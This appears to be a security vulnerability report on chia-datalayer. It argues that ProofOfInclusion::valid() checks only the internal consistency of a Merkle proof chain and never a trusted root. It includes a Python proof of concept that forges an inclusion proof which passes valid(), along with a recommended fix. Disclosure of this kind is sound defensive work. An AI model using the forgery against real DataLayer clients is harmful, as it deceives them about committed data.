### Title
`ProofOfInclusion::valid()` Never Verifies Against a Trusted Root — Forged DataLayer Inclusion Proofs Always Pass - (File: crates/chia-datalayer/src/merkle/proof_of_inclusion.rs)

### Summary

`ProofOfInclusion::valid()` in `chia-datalayer` only checks the internal self-consistency of the proof chain. Because `root_hash()` is derived from the last `combined_hash` in the same `layers` array that `valid()` iterates over, the final equality check `existing_hash == self.root_hash()` is a tautology — it is always `true` whenever the loop completes without returning `false`. An attacker who controls a serialized `ProofOfInclusion` can construct a completely fabricated proof chain that passes `valid()` for any claimed key-value pair, against any claimed root, without possessing the actual DataLayer tree.

### Finding Description

`ProofOfInclusion` is a `Streamable` (serializable/deserializable) struct exposed via Python bindings. Its `valid()` method is the sole verification API:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;
    }

    existing_hash == self.root_hash()   // ← always true
}
``` [1](#0-0) 

`root_hash()` is defined as:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

After the loop, `existing_hash` holds the last `calculated_hash`, which was already verified to equal `layer.combined_hash` for the last layer. `self.root_hash()` returns that same `last.combined_hash`. Therefore `existing_hash == self.root_hash()` is unconditionally `true` when the loop exits normally. The final check provides zero security.

The `valid()` method only verifies that each `combined_hash` is correctly derived from the previous hash and `other_hash` — i.e., internal chain consistency — but never verifies that the chain terminates at a specific, externally-trusted Merkle root. An attacker can fabricate any proof chain with arbitrary `node_hash`, `other_hash`, and self-consistent `combined_hash` values, and `valid()` will return `true`. [3](#0-2) 

The struct is `Streamable` (deserializable from bytes), making it trivially constructable from untrusted input: [4](#0-3) 

The Python binding exposes `valid()` directly: [5](#0-4) 

### Impact Explanation

Any DataLayer client that receives a `ProofOfInclusion` from an untrusted source and calls `proof.valid()` as the sole verification step will accept forged proofs. An attacker can prove inclusion of any key-value pair in any DataLayer store without possessing the actual tree, enabling them to deceive clients about committed DataLayer state. This matches the allowed High impact: "DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion … or lets untrusted input prove invalid state."

### Likelihood Explanation

The `valid()` method is the only verification API on `ProofOfInclusion`. Its name implies completeness. The fuzz target and all tests call only `proof.valid()` without separately checking `proof.root_hash()` against a trusted on-chain root: [6](#0-5) [7](#0-6) 

Any downstream DataLayer client following the same pattern — which the API strongly encourages — is vulnerable.

### Recommendation

`valid()` must accept a trusted root hash as a parameter and compare the computed chain terminus against it:

```rust
pub fn valid_against_root(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == trusted_root   // compare against externally-trusted root
}
```

Alternatively, rename the current `valid()` to `is_internally_consistent()` to make its limited scope explicit, and require callers to separately assert `proof.root_hash() == trusted_root`. Update all call sites, Python bindings, and fuzz targets accordingly.

### Proof of Concept

```python
from chia_rs import MerkleBlob, KeyId, ValueId, ProofOfInclusion, ProofOfInclusionLayer, Side
import hashlib

# Attacker wants to forge a proof that key=999 exists in some store
# with a fake root they control.

def internal_hash(left: bytes, right: bytes) -> bytes:
    return hashlib.sha256(b"\x02" + left + right).digest()

# Fabricate a leaf hash for the claimed (key=999, value=999) node
fake_node_hash = hashlib.sha256(b"fake_leaf_999").digest()

# Fabricate a sibling hash
fake_other_hash = hashlib.sha256(b"fake_sibling").digest()

# Compute a self-consistent combined_hash
fake_combined = internal_hash(fake_other_hash, fake_node_hash)  # other is Left

# Construct a forged ProofOfInclusion
layer = ProofOfInclusionLayer(
    other_hash_side=Side.Left,
    other_hash=fake_other_hash,
    combined_hash=fake_combined,
)
forged_proof = ProofOfInclusion(node_hash=fake_node_hash, layers=[layer])

# valid() returns True — forged proof accepted
assert forged_proof.valid(), "Expected forged proof to pass valid()"
# root_hash() returns the attacker-controlled fake_combined
assert forged_proof.root_hash() == fake_combined
```

The forged proof passes `valid()` because the loop verifies `internal_hash(fake_other_hash, fake_node_hash) == fake_combined` (true by construction), and the final check `existing_hash == self.root_hash()` compares `fake_combined` to `fake_combined` — always true.

### Citations

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L13-18)
```rust
#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusionLayer {
    pub other_hash_side: Side,
    pub other_hash: Hash,
    pub combined_hash: Hash,
}
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L25-29)
```rust
#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusion {
    pub node_hash: Hash,
    pub layers: Vec<ProofOfInclusionLayer>,
}
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L32-38)
```rust
    pub fn root_hash(&self) -> Hash {
        if let Some(last) = self.layers.last() {
            last.combined_hash
        } else {
            self.node_hash
        }
    }
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L40-58)
```rust
    pub fn valid(&self) -> bool {
        let mut existing_hash = self.node_hash;

        for layer in &self.layers {
            let calculated_hash = crate::calculate_internal_hash(
                &existing_hash,
                layer.other_hash_side,
                &layer.other_hash,
            );

            if calculated_hash != layer.combined_hash {
                return false;
            }

            existing_hash = calculated_hash;
        }

        existing_hash == self.root_hash()
    }
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L61-72)
```rust
#[cfg(feature = "py-bindings")]
#[pymethods]
impl ProofOfInclusion {
    #[pyo3(name = "root_hash")]
    pub fn py_root_hash(&self) -> Hash {
        self.root_hash()
    }
    #[pyo3(name = "valid")]
    pub fn py_valid(&self) -> bool {
        self.valid()
    }
}
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L115-124)
```rust
            for kv_id in keys_values.keys().copied() {
                let proof_of_inclusion = match merkle_blob.get_proof_of_inclusion(kv_id) {
                    Ok(proof_of_inclusion) => proof_of_inclusion,
                    Err(error) => {
                        open_dot(merkle_blob.to_dot().unwrap().set_note(&error.to_string()));
                        panic!("here");
                    }
                };
                assert!(proof_of_inclusion.valid());
            }
```

**File:** crates/chia-datalayer/fuzz/fuzz_targets/proofs_of_inclusion.rs (L28-31)
```rust
    for key in keys {
        let proof = blob.get_proof_of_inclusion(key).unwrap();
        assert!(proof.valid());
    }
```
